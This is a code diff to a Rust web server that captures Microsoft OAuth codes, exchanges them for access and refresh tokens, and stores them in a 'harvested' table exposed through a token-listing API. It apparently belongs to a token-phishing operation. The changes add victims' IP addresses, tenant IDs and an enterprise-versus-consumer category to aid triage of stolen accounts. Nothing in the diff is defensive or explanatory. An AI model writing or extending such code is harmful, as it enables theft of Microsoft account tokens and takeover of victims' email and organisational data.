@@ -108,6 +108,11 @@ struct HarvestedToken {
     #[serde(rename = "created_at")]
     captured_at: chrono::DateTime<Utc>,
     source: String,
+    ip_address: Option<String>,
+    location: Option<String>,
+    tenant_id: Option<String>,
+    category: Option<String>,
+    last_refreshed_at: Option<chrono::DateTime<Utc>>,
 }
 
 #[derive(Clone)]
@@ -399,7 +404,34 @@ struct ExchangeQuery {
     code: String,
 }
 
-async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppState>) -> impl Responder {
+fn detect_tenant(email: &str) -> (Option<String>, Option<String>) {
+    let parts: Vec<&str> = email.split('@').collect();
+    if parts.len() == 2 {
+        let domain = parts[1].to_lowercase();
+        // Detect enterprise vs consumer
+        let category = if domain.contains("onmicrosoft.com") || domain.contains("microsoft.com") || domain.contains("office365") || domain.contains("exchange") {
+            Some("enterprise".to_string())
+        } else if domain.contains("outlook.com") || domain.contains("hotmail.com") || domain.contains("live.com") || domain.contains("msn.com") {
+            Some("consumer".to_string())
+        } else {
+            Some("enterprise".to_string()) // Default to enterprise for custom domains
+        };
+        // Extract tenant ID from onmicrosoft.com domains
+        let tenant_id = if domain.contains("onmicrosoft.com") {
+            domain.split('.').next().map(|s| s.to_string())
+        } else {
+            Some(domain.clone())
+        };
+        return (tenant_id, category);
+    }
+    (None, Some("unknown".to_string()))
+}
+
+async fn exchange_code(
+    query: web::Query<ExchangeQuery>,
+    req: actix_web::HttpRequest,
+    state: web::Data<AppState>,
+) -> impl Responder {
     let code = &query.code;
     let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
     let params = [
@@ -422,10 +454,18 @@ async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppSta
                 let refresh_expires_at = Utc::now() + Duration::days(90);
                 let email = fetch_user_email(access_token).await;
                 let email_str = email.clone().unwrap_or_else(|| "unknown".to_string());
-                println!("Attempting to insert token for email: {:?}", email);
+                
+                // Detect tenant and category
+                let (tenant_id, category) = detect_tenant(&email_str);
+                
+                // Get IP address from request
+                let ip_address = req.connection_info().peer_addr().map(|s| s.to_string()).unwrap_or_else(|| "unknown".to_string());
+                let location = Some("Unknown".to_string()); // Will be resolved via geolocation API
+                
+                println!("Attempting to insert token for email: {:?}, tenant: {:?}, category: {:?}", email, tenant_id, category);
                 // Store in harvested table (legacy, for dashboard display)
                 sqlx::query(
-                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source) VALUES (?, ?, ?, ?, ?, ?, ?)"
+                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                 )
                 .bind(&id)
                 .bind(&email)
@@ -434,6 +474,11 @@ async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppSta
                 .bind(refresh_expires_at)
                 .bind(Utc::now())
                 .bind("oauth_app")
+                .bind(&ip_address)
+                .bind(&location)
+                .bind(&tenant_id)
+                .bind(&category)
+                .bind(Option::<chrono::DateTime<Utc>>::None)
                 .execute(&state.pool)
                 .await
                 .ok();
@@ -463,7 +508,7 @@ async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppSta
 
 // JSON API: list all tokens
 async fn api_tokens(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
@@ -893,7 +938,12 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
             refresh_token TEXT NOT NULL,
             expires_at DATETIME NOT NULL,
             captured_at DATETIME NOT NULL,
-            source TEXT NOT NULL
+            source TEXT NOT NULL,
+            ip_address TEXT,
+            location TEXT,
+            tenant_id TEXT,
+            category TEXT,
+            last_refreshed_at DATETIME
         )"
     ).execute(pool).await?;
 
